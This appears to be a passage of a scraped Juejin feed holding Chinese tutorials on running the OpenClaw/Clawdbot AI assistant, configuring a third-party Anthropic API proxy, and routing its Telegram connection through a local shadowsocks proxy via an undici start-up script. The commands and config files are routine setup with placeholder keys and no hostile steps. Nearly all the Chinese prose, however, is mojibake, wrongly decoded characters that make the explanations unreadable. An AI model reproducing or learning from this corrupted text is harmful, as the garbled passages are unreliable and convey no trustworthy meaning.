<p>ä¸‹è½½å®Œæˆåæœ‰è®¸å¤šé…ç½®è®©ä½ é€‰ï¼Œé€šè¿‡é”®ç›˜ä¸Šä¸‹å·¦å³é€‰æ‹©ï¼Œä»¥åŠç©ºæ ¼é€‰ä¸­å’Œå›è½¦æ¥ç¡®å®šã€‚è¿™é‡Œå°±çœç•¥æ‰äº†ï¼Œå¯ä»¥å…¨éƒ¨[ skip for now ]ï¼Œæœ€é‡è¦çš„æ˜¯å…ˆè·‘èµ·è·¯æ¥ã€‚make it workï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe50d5e1455f438f9282f84a93341848~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372241&amp;x-signature=ZsRoUiTD6KB55Uyx2O4%2BNH614Go%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™é‡Œå°±å·®ä¸å¤šäº†ã€‚æ—¢ç„¶å®‰è£…å®Œäº†ï¼Œå°±è¦è®©å®ƒåŠ¨èµ·æ¥ã€‚</p>
<h2 data-id="heading-3"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>ä½¿ç”¨</h2>
<p>ç¬¬ä¸€æ­¥ï¼šå¯åŠ¨</p>
<pre><code class="hljs language-bash" lang="bash">openclaw gateway --verbose
</code></pre>
<p>ç»ˆç«¯ä¼šè¿è¡Œ clawdbotæœåŠ¡ï¼Œå¯ä»¥ä¿æŒè¿™ä¸ªç»ˆç«¯çš„çŠ¶æ€ï¼Œæ‰“å¼€ä¸€ä¸ªæ–°çš„ç»ˆç«¯ï¼Œè¾“å…¥</p>
<pre><code class="hljs language-bash" lang="bash">openclawÂ dashboard
</code></pre>
<p>ç”Ÿæˆäº†ä¸€ä¸ªå¸¦æœ‰tokençš„é“¾æ¥ï¼Œæ‰“å¼€å®ƒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c36cf640e009477ea7c58fbb221662e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372241&amp;x-signature=DmHfh%2FxQvBH9G88PMG%2FemDZCjFM%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c5a6326fcf54ef89573b40111546ab5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372241&amp;x-signature=hAhiO1gCQ55y1WygeVvbJCFc6TM%3D" alt="image.png" loading="lazy"/></p>
<p>åˆ°è¿™å°±å·²â€åŸºæœ¬æˆåŠŸâ€œã€‚</p>
<p>é…ç½®APIæ–¹æ³• ï¼š<a href="https://juejin.cn/post/7600953879500619827" target="_blank" title="https://juejin.cn/post/7600953879500619827">openclaw UIæ–¹å¼é…ç½®APIåœ¨æ‰§è¡Œ openclaw dashborad æŒ‡ä»¤åæ‰“å¼€å¸¦æœ‰tokençš„urlé“¾æ¥ï¼Œ - æ˜é‡‘</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Clawdbot/Moltbotï¼šå¯¹æ¥Telegramé…ç½®å®å½•ï¼ˆé™„æœ‰LLM æ‘˜è¦ï¼‰]]></title>    <link>https://juejin.cn/post/7600752623068741642</link>    <guid>https://juejin.cn/post/7600752623068741642</guid>    <pubDate>2026-01-30T09:32:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600752623068741642" data-draft-id="7600967006892949513" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Clawdbot/Moltbotï¼šå¯¹æ¥Telegramé…ç½®å®å½•ï¼ˆé™„æœ‰LLM æ‘˜è¦ï¼‰"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC"/> <meta itemprop="datePublished" content="2026-01-30T09:32:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="yezannnnnn"/> <meta itemprop="url" content="https://juejin.cn/user/958429869908247"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Clawdbot/Moltbotï¼šå¯¹æ¥Telegramé…ç½®å®å½•ï¼ˆé™„æœ‰LLM æ‘˜è¦ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/958429869908247/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    yezannnnnn
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T09:32:04.000Z" title="Fri Jan 30 2026 09:32:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{font-family:-apple-system,system-ui,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,sans-serif,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial;color:#00325e}.markdown-body ::selection{background-color:#00325e;color:#fff}.markdown-body blockquote{padding:10px 20px;background-color:#fffaf0;box-shadow:0 3px 10px 0 rgba(255,172,194,.24);border:1px solid #f3ca8e;transition:all .2s;margin:1em 0;border-radius:5px}.markdown-body blockquote p{font-size:14px;line-height:25px;color:#795548}.markdown-body blockquote p:last-child{margin:0}.markdown-body blockquote:hover{border-color:#ff9800;background-color:#fff8e0;box-shadow:0 6px 10px -5px rgba(225,173,98,.3803921569)}.markdown-body blockquote code{color:#ff502c}.markdown-body pre{border:1px solid #8cc0f3;box-shadow:0 3px 10px 0 rgba(255,198,198,.28);border-radius:5px;transition:all .2s;overflow-x:auto;white-space:pre-wrap}.markdown-body pre:hover{border-color:#6d9dce}.markdown-body pre&gt;code{padding:10px 20px;color:#00325e;background:#f0f8ff;font-size:12px;line-height:1.6;display:block}.markdown-body code{background:#f6fbff;color:#0b5393;padding:2px 4px;border-radius:4px;font-size:12px}.markdown-body p{font-size:14px;line-height:28px;text-align:justify;margin-bottom:17px;color:#595959}.markdown-body a{color:#00325e;text-decoration:none}.markdown-body a:after{content:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAAXNSR0IArs4c6QAAAQdJREFUKFNt0DtLA0EUBeBzZle0Eks7rcUfEfBRCha7NorYa6NmVJzgyi4smUgKtdZGCJktLMVH4Y8QeztLWyE7VyLEuNFbXj4Oh0P8c8mZm+uJrEN4BJFTeP/MUVe3bnocfALwkOlo1zS7iZAzf6Cx7oXgbaqjxiDEWCcVaGyxQ8pSWo9XhqhoQ/xUFbaKjhe5V+CmR7mnSplEEF6GSmJ+F/d0KHvbCIIJCLc85U6BC5mONgbJNM3uFag++sX7z8O8MzsWBucifMx0dDGE1kmm458KDVukAlnNdDz/exEeW3dNkbfsYC0xtmgDWP6ELLZ0/F6BJu/UoFQN5AkoeUjeJPvx6+i+X5Sjah4tA6gYAAAAAElFTkSuQmCC);margin-left:2px}.markdown-body a:hover{box-shadow:0 1px}.markdown-body table{max-width:100%;border-collapse:collapse;border-spacing:0;box-shadow:0 3px 10px 0 rgba(255,238,172,.24);transition:all .2s}.markdown-body table:hover{box-shadow:0 3px 10px 0 rgba(185,169,103,.24)}.markdown-body table tr th{border:1px solid #8cc0f3;background-color:#f0f8ff;padding:12px 15px}.markdown-body table tr td{border:1px solid rgba(243,202,142,.4);padding:12px 15px}.markdown-body table tbody tr{transition:all .2s}.markdown-body table tbody tr:hover td{border-color:#f3ca8e;background-color:#fff8e0;z-index:1}.markdown-body img{max-width:100%}.markdown-body h1{font-size:20px;margin-top:30px;margin-bottom:10px;padding-left:30px;position:relative}.markdown-body h1&gt;code{font-size:20px}.markdown-body h1:before{content:"ğŸº";display:block;font-size:18px;width:18px;height:18px;left:0;position:absolute}.markdown-body h2{font-size:18px;margin-top:30px;margin-bottom:10px;padding-left:28px;position:relative}.markdown-body h2&gt;code{font-size:18px}.markdown-body h2:before{content:"ğŸ»";display:block;font-size:16px;width:16px;height:16px;left:0;position:absolute}.markdown-body h3{font-size:16px;margin-top:30px;margin-bottom:10px;padding-left:26px;position:relative}.markdown-body h3&gt;code{font-size:16px}.markdown-body h3:before{content:"ğŸ¥‚";display:block;font-size:14px;width:14px;height:14px;left:0;position:absolute}.markdown-body h4{font-size:14px;margin-top:30px;margin-bottom:10px;padding-left:24px;position:relative}.markdown-body h4&gt;code{font-size:14px}.markdown-body h4:before{content:"ğŸ¥ƒ";display:block;font-size:12px;width:12px;height:12px;left:0;position:absolute}.markdown-body h5{font-size:12px;margin-top:30px;margin-bottom:10px}.markdown-body h5&gt;code{font-size:12px}.markdown-body h6{font-size:10px;margin-top:30px;margin-bottom:10px}.markdown-body h6&gt;code{font-size:10px}.markdown-body h1,.markdown-body h2{color:#ff502c}.markdown-body hr{height:4px;border:none;margin-top:32px;margin-bottom:32px;background-size:4px 1px;background-image:linear-gradient(270deg,#6d9dce,#8cc0f3 25%,transparent 50%)}.markdown-body hr:nth-child(2n){background-image:linear-gradient(270deg,#ff9800,#fff8e0 25%,transparent 50%)}.markdown-body ul{padding-inline-start:20px}.markdown-body ul li{list-style-type:"ğŸ”¸"}.markdown-body ul li li{list-style-type:"â—»ï¸"}.markdown-body ul li li li{list-style-type:"â–«ï¸"}.markdown-body ol{padding-inline-start:20px}.markdown-body ol ::marker{color:#ff9800}.markdown-body ol,.markdown-body ul{line-height:2em}.markdown-body li{padding-inline-start:1ch}.markdown-body li.task-list-item{list-style:none;padding-inline-start:0}.markdown-body li input{padding-right:2px}.markdown-body li input[type=checkbox i]{appearance:none}.markdown-body li input:before{content:"ğŸŸ©";display:block;width:13px;height:13px}.markdown-body li input:checked:before{content:"âœ…"}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atelier-sulphurpool-light">.hljs-comment,.hljs-quote{color:#6b7394}.hljs-attribute,.hljs-link,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#c94922}.hljs-built_in,.hljs-builtin-name,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#c76b29}.hljs-bullet,.hljs-string,.hljs-symbol{color:#ac9739}.hljs-section,.hljs-title{color:#3d8fd1}.hljs-keyword,.hljs-selector-tag{color:#6679cc}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#f5f7ff;color:#5e6687}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Clawdbot/Moltbotï¼šå¯¹æ¥Telegramé…ç½®å®å½•</h2>
<blockquote>
<p>ä»å®‰è£…åˆ° Telegram é›†æˆï¼Œä¸€ä¸ªæŠ˜è…¾äº†æ•°å°æ—¶çš„çœŸå®ç»å†</p>
</blockquote>
<h3 data-id="heading-1">å‰è¨€</h3>
<p>Clawdbotï¼ˆç°å·²æ›´åä¸º Moltbotï¼‰æ˜¯ä¸€ä¸ªå¼€æºçš„æœ¬åœ° AI åŠ©æ‰‹ï¼Œå¯ä»¥é€šè¿‡ Telegramã€WhatsAppã€Discord ç­‰æ¶ˆæ¯åº”ç”¨ä¸ Claude æ¨¡å‹äº¤äº’ã€‚æœ¬æ–‡è®°å½•äº†åœ¨ç‰¹æ®Šç½‘ç»œç¯å¢ƒä¸‹é…ç½® Clawdbot çš„å®Œæ•´è¿‡ç¨‹ï¼ŒåŒ…æ‹¬é‡åˆ°çš„å„ç§é—®é¢˜å’Œè§£å†³æ–¹æ¡ˆã€‚</p>
<p><strong>ç¯å¢ƒä¿¡æ¯ï¼š</strong></p>
<ul>
<li>æ“ä½œç³»ç»Ÿï¼šmacOS 14.5</li>
<li>Node.jsï¼šv22.22.0</li>
<li>Clawdbot ç‰ˆæœ¬ï¼š2026.1.24-3</li>
<li>ç½‘ç»œç¯å¢ƒï¼šéœ€è¦é­”æ³•ä¸Šç½‘è®¿é—®å¢ƒå¤–æœåŠ¡</li>
</ul>
<hr/>
<h3 data-id="heading-2">ä¸€ã€å®‰è£… Clawdbot</h3>
<h4 data-id="heading-3">1.1 å‰ç½®æ¡ä»¶</h4>
<p>ç¡®ä¿ Node.js ç‰ˆæœ¬ä¸ä½äº 22.0.0ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨ nvm å®‰è£…</span>
nvm install 22
nvm use 22
nvm <span class="hljs-built_in">alias</span> default 22

<span class="hljs-comment"># éªŒè¯ç‰ˆæœ¬</span>
node --version  <span class="hljs-comment"># åº”æ˜¾ç¤º v22.x.x</span>
</code></pre>
<h4 data-id="heading-4">1.2 å…¨å±€å®‰è£…</h4>
<pre><code class="hljs language-bash" lang="bash">npm install -g clawdbot
</code></pre>
<h4 data-id="heading-5">1.3 åˆå§‹åŒ–é…ç½®</h4>
<pre><code class="hljs language-bash" lang="bash">clawdbot onboard
</code></pre>
<p>é…ç½®å‘å¯¼ä¼šå¼•å¯¼ä½ å®ŒæˆåŸºæœ¬è®¾ç½®ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">ğŸ¦ Clawdbot <span class="hljs-number">2026.1</span>.<span class="hljs-number">24</span>-<span class="hljs-number">3</span>
â”‚
â—‡  å®‰å…¨æç¤º â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®
â”‚  Clawdbot å¯ä»¥è¿è¡Œå‘½ä»¤ã€è¯»å†™æ–‡ä»¶ï¼Œè¯·ç¡®ä¿äº†è§£ç›¸å…³é£é™©ã€‚        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯
â”‚
â—‡  æˆ‘å·²äº†è§£é£é™©ï¼Œç»§ç»­ï¼Ÿ
â”‚  æ˜¯
â”‚
â—‡  é€‰æ‹©æ¨¡å‹/è®¤è¯æä¾›å•†
â”‚  Anthropic
â”‚
â—‡  é€‰æ‹©è®¤è¯æ–¹å¼
â”‚  Anthropic API <span class="hljs-keyword">key</span>
</code></pre>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/455024c278a5446dab4debca9ced00af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeWV6YW5ubm5ubg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770370826&amp;x-signature=1SC%2B7yAyhQf0De300pq0FYMl0oE%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-6">äºŒã€API ä»£ç†é…ç½®ï¼ˆæ¨èæ–¹æ¡ˆï¼‰</h3>
<p>å¯¹äºéœ€è¦é­”æ³•ä¸Šç½‘çš„ç”¨æˆ·ï¼Œä½¿ç”¨ç¬¬ä¸‰æ–¹ API ä»£ç†æœåŠ¡æ˜¯æœ€ç¨³å®šçš„æ–¹æ¡ˆã€‚</p>
<h4 data-id="heading-7">2.1 é…ç½®æ–‡ä»¶ç»“æ„</h4>
<pre><code class="hljs language-bash" lang="bash">~/.clawdbot/
â”œâ”€â”€ clawdbot.json                    <span class="hljs-comment"># ä¸»é…ç½®æ–‡ä»¶</span>
â””â”€â”€ agents/
    â””â”€â”€ main/
        â””â”€â”€ agent/
            â””â”€â”€ auth-profiles.json   <span class="hljs-comment"># è®¤è¯é…ç½®æ–‡ä»¶</span>
</code></pre>
<h4 data-id="heading-8">2.2 ä¸»é…ç½®æ–‡ä»¶</h4>
<p><strong>æ–‡ä»¶ä½ç½®ï¼š</strong> <code>~/.clawdbot/clawdbot.json</code></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"models"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"providers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"anthropic"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"baseUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://ä½ çš„ä»£ç†åœ°å€.com"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"apiKey"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä½ çš„APIå¯†é’¥"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"api"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"anthropic-messages"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"models"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"agents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"defaults"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"primary"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"anthropic/claude-sonnet-4-5-20250929"</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"workspace"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/Users/ä½ çš„ç”¨æˆ·å/clawd"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-9">2.3 å…³é”®é…ç½®é¡¹è¯´æ˜</h4>






























<table><thead><tr><th>å­—æ®µ</th><th>è¯´æ˜</th><th align="center">å¿…éœ€</th></tr></thead><tbody><tr><td><code>baseUrl</code></td><td>API ä»£ç†åœ°å€</td><td align="center">âœ…</td></tr><tr><td><code>apiKey</code></td><td>ä»£ç†æœåŠ¡çš„ API å¯†é’¥</td><td align="center">âœ…</td></tr><tr><td><code>api</code></td><td><strong>å¿…é¡»</strong>è®¾ç½®ä¸º <code>anthropic-messages</code></td><td align="center">âœ…</td></tr><tr><td><code>models</code></td><td><strong>å¿…é¡»</strong>åŒ…å«æ­¤å­—æ®µï¼Œå¯ä»¥ä¸ºç©ºæ•°ç»„ <code>[]</code></td><td align="center">âœ…</td></tr></tbody></table>
<blockquote>
<p>âš ï¸ <strong>è¸©å‘ç‚¹ï¼š</strong> å¦‚æœç¼ºå°‘ <code>api</code> æˆ– <code>models</code> å­—æ®µï¼Œä¼šå¯¼è‡´ HTTP 403 é”™è¯¯ï¼è¿™æ˜¯æˆ‘èŠ±äº†å¾ˆé•¿æ—¶é—´æ‰å‘ç°çš„é—®é¢˜ã€‚</p>
</blockquote>
<h4 data-id="heading-10">2.4 è®¤è¯é…ç½®æ–‡ä»¶</h4>
<p><strong>æ–‡ä»¶ä½ç½®ï¼š</strong> <code>~/.clawdbot/agents/main/agent/auth-profiles.json</code></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"profiles"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"anthropic:default"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"api_key"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"provider"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"anthropic"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"apiKey"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä½ çš„APIå¯†é’¥"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-11">2.5 éªŒè¯ API é…ç½®</h4>
<p>é…ç½®å®Œæˆåï¼Œç”¨ curl æµ‹è¯• API æ˜¯å¦å¯ç”¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># âŒ è¿™é‡Œæ³¨æ„è¯·æ±‚çš„modelæ˜¯è‡ªå·±ä»¤ç‰Œæ”¯æŒçš„ï¼</span>
curl -H <span class="hljs-string">"x-api-key: ä½ çš„APIå¯†é’¥"</span> \
  -H <span class="hljs-string">"content-type: application/json"</span> \
  -H <span class="hljs-string">"anthropic-version: 2023-06-01"</span> \
  -d <span class="hljs-string">'{"model":"claude-sonnet-4-5-20250929","max_tokens":50,"messages":[{"role":"user","content":"ä½ å¥½"}]}'</span> \
  https://ä½ çš„ä»£ç†åœ°å€.com/v1/messages
</code></pre>
<p>é¢„æœŸè¿”å›ç±»ä¼¼ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"msg_xxx"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"message"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"role"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"assistant"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"text"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä½ å¥½ï¼æœ‰ä»€ä¹ˆæˆ‘å¯ä»¥å¸®åŠ©ä½ çš„å—ï¼Ÿ"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-12">ä¸‰ã€ä»£ç†é…ç½®ï¼ˆæ ¸å¿ƒéš¾ç‚¹ï¼‰</h3>
<p>ç”±äº Telegram API éœ€è¦é­”æ³•è®¿é—®ï¼Œè¿™æ˜¯é…ç½®ä¸­æœ€å¤æ‚çš„éƒ¨åˆ†ã€‚</p>
<h4 data-id="heading-13">3.1 é—®é¢˜ï¼šNode.js ä¸è¯»å–ç³»ç»Ÿä»£ç†</h4>
<p>è®¾ç½®ç¯å¢ƒå˜é‡å¯¹ Node.js 22 çš„ç½‘ç»œè¯·æ±‚æ— æ•ˆï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># âŒ è¿™æ ·åšæ˜¯æ— æ•ˆçš„ï¼</span>
<span class="hljs-built_in">export</span> HTTP_PROXY=http://127.0.0.1:1087
<span class="hljs-built_in">export</span> HTTPS_PROXY=http://127.0.0.1:1087
clawdbot gateway  <span class="hljs-comment"># Telegram è¿æ¥ä»ä¼šå¤±è´¥</span>
</code></pre>
<p>ä¼šçœ‹åˆ°å¦‚ä¸‹é”™è¯¯ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">telegram</span>] telegram setMyCommands failed: HttpError: Network request failed!
[<span class="hljs-meta">clawdbot</span>] Unhandled promise rejection: TypeError: fetch failed
</code></pre>
<h4 data-id="heading-14">3.2 è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨ undici ä»£ç†</h4>
<blockquote>
<p>å®‰è£…å‰è¯·å…ˆæœ‰è‡ªå·±çš„æ¢¯å­ï¼Œç¬”è€…ç”¨çš„<strong>shadowsocks</strong>ä¸”ä»£ç†ç«¯å£1087</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53168b4ea2494604a783bd18331c2f2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeWV6YW5ubm5ubg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770370826&amp;x-signature=NZq8ORaJyAxIq7KtD2KITM8tM10%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ­¥éª¤ä¸€ï¼šå®‰è£… undici</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4611913382d14081a6e3afa7a30924cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeWV6YW5ubm5ubg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770370826&amp;x-signature=O6QpF3f58%2BTfCWq%2BAgzixgUh5TQ%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-bash" lang="bash">npm install -g undici
</code></pre>
<p><strong>æ­¥éª¤äºŒï¼šåˆ›å»ºä»£ç†é…ç½®è„šæœ¬</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> &gt; ~/proxy-setup.js &lt;&lt; <span class="hljs-string">'EOF'</span>
const { setGlobalDispatcher, ProxyAgent } = require(<span class="hljs-string">'undici'</span>);
setGlobalDispatcher(new ProxyAgent(<span class="hljs-string">'http://127.0.0.1:1087'</span>));
console.log(<span class="hljs-string">'[ä»£ç†] å·²è®¾ç½®å…¨å±€ä»£ç†: http://127.0.0.1:1087'</span>);
EOF
</code></pre>
<blockquote>
<p>æ³¨æ„ï¼šè¯·å°† <code>1087</code> æ›¿æ¢ä¸ºä½ å®é™…çš„ä»£ç†ç«¯å£</p>
</blockquote>
<p><strong>æ­¥éª¤ä¸‰ï¼šåˆ›å»ºå¯åŠ¨è„šæœ¬</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> &gt; ~/start-clawdbot.sh &lt;&lt; <span class="hljs-string">'EOF'</span>
<span class="hljs-comment">#!/bin/bash</span>
NODE_PATH=$(npm root -g) node --require ~/proxy-setup.js $(<span class="hljs-built_in">which</span> clawdbot) gateway --port 18789
EOF

<span class="hljs-built_in">chmod</span> +x ~/start-clawdbot.sh
</code></pre>
<p><strong>æ­¥éª¤å››ï¼šä½¿ç”¨å¯åŠ¨è„šæœ¬è¿è¡Œ</strong></p>
<pre><code class="hljs language-bash" lang="bash">~/start-clawdbot.sh
</code></pre>
